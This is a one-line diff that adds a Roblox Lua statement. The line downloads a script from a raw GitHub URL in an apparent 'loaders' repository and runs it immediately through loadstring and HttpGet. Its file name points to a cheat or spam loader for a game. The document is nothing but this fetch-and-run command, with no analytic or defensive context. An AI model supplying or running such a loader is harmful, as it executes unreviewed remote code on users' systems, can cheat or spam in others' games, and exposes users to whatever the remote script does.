@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/prospecting-spam6-iaaej0fyjq3eao.lua"))()
